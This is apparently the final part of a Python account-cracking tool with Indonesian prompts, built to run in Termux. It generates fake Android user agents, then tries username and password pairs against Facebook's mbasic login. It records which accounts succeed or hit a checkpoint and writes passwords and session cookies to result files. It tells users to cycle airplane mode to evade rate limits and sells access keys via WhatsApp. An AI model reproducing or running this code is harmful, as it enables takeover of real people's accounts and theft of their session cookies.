                self.android_model = random.choice(['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005'])
                self.build = (f"{random.choice(['RP1A', 'TP1A', 'SKQ1', 'SP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Advan" in str(self.device):
                self.android_model = random.choice(['5041', '5041', '5058', '5059', '5059', '5061', '5062', '5062', 'E1C_3G', 'E1C_3G', 'E1C Pro', '6004', '6002', '6002', '6201', 'i7U', 'i7U', 'i4U', 'i4U', 'i55D', 'i55D', 'i55K', 'i55K', 'i5C', 'i5C', 'i5C', 'I5E', 'i5E', 'i5E', 'i5K', 'i5K', 'i7A', 'I7D', 'I7D', 'ADVAN M4', '5202', '5505', '5505', 'ADVAN S40', 'ADVAN S40', 'S45E', 'S4Z', 'S4Z', 'S4Z', 'S4Z', 'i5G', 'S50H', 'S5E_NXT', 'S5E_NXT', 'S5E_NXT', 'S7D', 'S7D', 'ADVAN 1011', 'ADVAN T5C'])
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Poco" in str(self.device):
                self.android_model = random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G'])
                self.build = (f"{random.choice(['TP1A', 'SP1A', 'RP1A', 'SKQ1'])}.{random.randrange(210000, 220000)}.0{random.randrange(10, 16)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Evercoss" in str(self.device):
                self.android_model = random.choice(['M50 STAR', 'A75 MAX', 'AT8B', 'A75 MAX', 'S55A', 'R70A'])
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Nokia" in str(self.device):
                self.android_model = random.choice(['Nokia 1', 'Nokia 1 Plus', 'Nokia 1011', 'Nokia 105', 'Nokia 2.1', 'Nokia 2 V', 'Nokia 2 V Tella', 'TA-1032', 'TA-1020', 'TA-1032', 'Nokia 3 V', 'Nokia_3310_4G', 'Nokia 3310', 'NOKIA 3310', 'Nokia 4', 'TA-1053', 'TA-1024', 'TA-1021', 'TA-1021', 'TA-1033', 'TA-1000', 'Nokia 1.3', 'TA-1041', 'Nokia 7', 'TA-1041', 'TA-1041', 'Nokia 7 plus', 'Nokia 7 plus', 'TA-1004', 'TA-1012', 'TA-1012', 'TA-1052', 'Nokia 8 Sirocco', 'Nokia 8910i', 'Nokia 8 V 5G UW', 'Nokia 9', 'Nokia C01 Plus', 'Nokia C01 Plus', 'Nokia C02', 'Nokia C1', 'es Nokia C1 Plus', 'Nokia C1', 'Nokia C1 Plus', 'Nokia C1 2nd Edition', 'Nokia C1', 'Nokia C1', 'Nokia C10', 'N152DL', 'Nokia C100', 'Nokia C12', 'Nokia C12 Pro', 'Nokia C2', 'Nokia C2', 'Nokia C2', 'Nokia C2 2nd Edition', 'Nokia C2 Tennen', 'Nokia C20', 'Nokia C20 Plus', 'Nokia C200', 'N151DL', 'Nokia C21', 'Nokia C21 Plus', 'Nokia C22', 'Nokia C3', 'Nokia C30', 'Nokia C31', 'Nokia C32', 'Nokia C5 Endi', 'Nokia G10', 'N150DL', 'Nokia G100', 'Nokia G11', 'Nokia G11 Plus', 'Nokia G20', 'Nokia G20', 'Nokia G21', 'Nokia G22', 'N1374DL', 'Nokia G400 5G', 'Nokia G50', 'Nokia G60 5G', 'Lumia 430', 'Nokia N900', 'Nokia Streaming Box 8000', 'Nokia T10', 'Nokia T20', 'Nokia T21', 'Nokia_X', 'Nokia_X', 'Nokia_X', 'Nokia X10', 'Nokia X100', 'Nokia_X2', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'Nokia X20', 'Nokia X30 5G', 'Nokia X5', 'Nokia X5', 'Nokia X6', 'Nokia X6', 'Nokia X7', 'Nokia X7', 'Nokia X71', 'Nokia_XL', 'Nokia_XL', 'Nokia_XL', 'Nokia XR20', 'Nokia XR21'])
                self.build = (f"{random.choice(['QKQ1', 'TKQ1', 'SKQ1', 'RKQ1'])}.{random.randrange(210000, 220000)}.00{random.randrange(2, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Blackberry" in str(self.device):
                self.blackberry_model = random.choice(['BB10; U; en-US; SM-T320NZWAXAR', 'BB10;Touch', 'BB10; Kbd', 'BlackBerry; U; BlackBerry 9890; en-US', 'BlackBerry; U; BlackBerry 9220; en-US', 'BlackBerry; U; BlackBerry 5080; en-US'])
                self.blackberry_browser_version = (f"{random.randrange(10, 523)}.0.{random.randrange(0, 3)}.{random.randrange(773, 1337)}")
                self.useragent = (f'Mozilla/5.0 ({self.blackberry_model}) AppleWebKit/534.11+ (KHTML, like Gecko) Version/{self.blackberry_browser_version} Mobile Safari/534.11+')
            else:
                self.android_model = random.choice(['RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                self.build = (f"{random.choice(['SP1A', 'RKQ1', 'QP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            return (self.useragent)
        except (Exception) as e:
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            self.android_model = random.choice(['RMX3661', 'RMX3687', 'RMX3686', 'RMX3241', 'RMX3388', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3612', 'RMX2202', 'RMX2121', 'RMX2176', 'RMX2052', 'RMX2075', 'RMX2076', 'RMX2144', 'RMX2111', 'RMX2200', 'RMX3092', 'RMX3093', 'RMX3042', 'RMX3041', 'RMX3125', 'RMX3122', 'RMX3121', 'RMX2205', 'RMX3161', 'RMX2205', 'RMX3396', 'RMX3572', 'RMX3242'])
            self.build = (f"{random.choice(['SP1A', 'RKQ1', 'QP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
            return (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')

class Terminal:

    def __init__(self) -> None:
        pass

    def Cek_Floder(self):
        if os.path.exists('Results') == False:
            os.mkdir('Results')
        else:
            pass
        if os.path.exists('Data') == False:
            os.mkdir('Data')
        else:
            pass
        self.Terminal_Size()
        return ("Sukses")
    
    def Terminal_Size(self):
        if int(re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)) < 65:
            Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Silahkan Kecilkan Termux Kamu Sampai Panel Ini Terlihat Rapi Dan Tidak Terlihat Putus-Putus Gunakan Dua Jari Lalu Cubit Layar Secara Bersamaan!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Kecilkan Termux)[bold green] <[bold yellow]<[bold red]<"))
            exit()
        else:
            if 'TERMUX_VERSION' in str(os.environ) or 'rozhak' in str(os.environ) or 'LAPTOP-LMA1HAAJ' in str(os.environ):
                self.Anti_WiFi()
            else:
                Banner()
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Jangan Gunakan Terminal Selain Termux Anda Juga Diwajibkan Menggunakan Termuc Versi Terbaru Agar Script Bisa Dijalankan Dengan Semourna!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Terminal Melanggar)[bold green] <[bold yellow]<[bold red]<"))
                exit()

    def Anti_WiFi(self):
        Devices = []
        for z in os.popen('arp -a'):
            Devices.append(z)
        if 'wlan' in str(Devices) or 'wlan0' in str(Devices):
            Banner()
            Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Anda Tidak Boleh Menggunakan Jaringan WiFi Kami Juga Diwajibkan Untuk Matikan Semua Koneksi Seperti : Hotspot, WiFi, Dan Bluetooth!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jaringan Terblokir)[bold green] <[bold yellow]<[bold red]<"))
            exit()
        else:
            Devices.clear()
            for z in os.popen('ip neigh show'): # pkg install iproute2
                Devices.append(z)
            if 'wlan' in str(Devices) or 'wlan0' in str(Devices):
                Banner()
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Anda Tidak Boleh Menggunakan Jaringan WiFi Kami Juga Diwajibkan Untuk Matikan Semua Koneksi Seperti : Hotspot, WiFi, Dan Bluetooth!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jaringan Terblokir)[bold green] <[bold yellow]<[bold red]<"))
                exit()
            else:
                return ("Sukses")

class Checker:

    def __init__(self) -> None:
        pass

    def Your_Files(self):
        global Sukses, Checkpoint
        try:
            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Silahkan Masukan File Checkpoint Pastikan File Tersebut Tersedia, Misalnya :[italic green] Results/{Convert().Tanggal()}.txt", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Checkpoint Files)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            files = Console().input("[bold dodger_blue3]   ╰─> ")
            self.open_files = open(files, 'r').read().splitlines()
            Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 50 Username Atau Jika Muncul Tulisan[italic blue] AttributeError[italic white] Dan Gunakan[italic green] CTRL + Z[italic white] Untuk Berhenti.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
            for z in self.open_files:
                try:
                    self.username, self.password = z.split('|')[0], z.split('|')[1]
                    self.Login_Checkpoint(self.open_files, self.username, [self.password])
                except (Exception, KeyboardInterrupt):
                    print("\r                                                        ", end='\r')
                    time.sleep(1.5)
                    continue
            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
            exit()
        except (Exception) as e:
            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
            exit()

    def Login_Checkpoint(self, total, username, your_password):
        global Sukses, Checkpoint, Looping
        try:
            for password in your_password:
                with requests.Session() as r:
                    self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    r.headers.update({
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-dest': 'document',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'connection': 'keep-alive',
                        'referer': 'https://mbasic.facebook.com/?ht_tooltip_selected=1&refid=8',
                        'cache-control': 'max-age=0',
                        'accept-language': 'en-US,en;q=0.9',
                        'upgrade-insecure-requests': '1',
                        'sec-fetch-user': '?1',
                        'useragent': self.useragent,
                        'sec-fetch-mode': 'navigate',
                        'Host': 'mbasic.facebook.com',
                    })
                    response = r.get('https://mbasic.facebook.com/?ht_tooltip_selected=0&refid=8').text
                    try:
                        self.action_url = re.search('method="post" action="(.*?)"', str(response)).group(1).replace('amp;', '')
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                    except (AttributeError):
                        print("\r                                                        ", end='\r')
                        print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                        time.sleep(1.5)
                        continue
                    data = {
                        'unrecognized_tries': '0',
                        'lsd': self.lsd,
                        'jazoest': self.jazoest,
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': '0',
                        'email': username,
                        'bi_xrwh': '0',
                        'pass': password,
                        'login': 'Log In',
                    }
                    r.headers.update({
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://mbasic.facebook.com',
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                    })
                    response2 = r.post('https://mbasic.facebook.com{}'.format(self.action_url), data = data, allow_redirects = True)
                    if 'checkpoint' in r.cookies.get_dict():
                        r.headers.pop('content-type');r.headers.pop('content-length')
                        r.headers.update({
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        })
                        response3 = r.get('https://mbasic.facebook.com/checkpoint/?_rdr').text
                        try:
                            self.fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response3)).group(1)
                            self.nh = re.search('name="nh" value="(.*?)" ', str(response3)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(.*?)"', str(response3)).group(1)
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{password}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold red]There was an error getting checkpoint options.", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{password}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{password}|{self.useragent}\n')
                            w.close()
                            continue
                        data = {
                            'submit[Continue]': 'Continue',
                            'fb_dtsg': self.fb_dtsg,
                            'nh': self.nh,
                            'jazoest': self.jazoest,
                            'checkpoint_data': '',
                            'fb_dtsg': self.fb_dtsg,
                            'jazoest': self.jazoest,
                        }
                        r.headers.update({
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'content-type': 'application/x-www-form-urlencoded',
                            'referer': 'https://mbasic.facebook.com/checkpoint/?_rdr',
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        })
                        response4 = r.post('https://mbasic.facebook.com/login/checkpoint/', data = data, allow_redirects = True).text
                        self.all_options = re.findall('<option id=".*?" value=".*?" selected=".*?">(.*?)</option>', str(response4))
                        if len(self.all_options) == 0:
                            self.all_options = re.findall('<option id=".*?" value=".*?">(.*?)</option>', str(response4))
                        if len(self.all_options) == 0:
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{password}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold red]There are no options available on your Facebook account.", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{password}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{password}|{self.useragent}\n')
                            w.close()
                            continue
                        else:
                            self.baris_baru = ('\n')
                            self.join_string = ''.join([f"{i}. {z}{self.baris_baru if int(i) != len(self.all_options) else ''}" for i, z in enumerate(self.all_options, 1)])
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{password}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold red]{self.join_string}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{password}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{password}|{self.useragent}\n')
                            w.close()
                            break
                    elif 'c_user' in r.cookies.get_dict():
                        self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        print("\r                                                        ", end='\r')
                        time.sleep(1.0)
                        tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                        tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{password}", style = "bold dodger_blue3", width = 30)]))
                        tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                        tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                        print(tree)
                        time.sleep(3.0)
                        Sukses.append(f'{username}|{password}|{self.cookies}|{self.useragent}')
                        with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                            w.write(f'{username}|{password}|{self.cookies}|{self.useragent}\n')
                        w.close()
                        break
                    else:
                        continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Login_Checkpoint(total, username, password)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')
            self.Login_Checkpoint(total, username, password)

def Buy_Apikey():
    Banner()
    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Apikey Kamu Sudah[italic red] Kadaluarsa[italic white] Agar Bisa Masuk Anda Harus Upgrade Ke[italic green] Premium[italic white], Pilih Harga[italic green] Perminggu[italic white] Atau[italic green] Perbulan[italic white] Dari List Di Bawah Ini Atau Melakukan Pembayaran Di ([italic green]https://wa.me/6283847921480[italic white])", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Upgrade Apikey)[bold green] <[bold yellow]<[bold red]<"))
    Console(style="bold dodger_blue3").print(Columns([
        Panel("[bold green]60k in one month", width=32),
        Panel("[bold green]25k in one week", width=32),
    ]))
    Console().input("[bold white][[bold green]Buy Apikey[bold white]]")
    os.system('xdg-open https://wa.me/6283847921480')
    exit()

if __name__ == '__main__':
    try:
        Terminal().Cek_Floder()
        os.system('git pull')
        Menu().Utama()
    except (KeyboardInterrupt):
        exit()
    except (Exception) as e:
        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
        exit()
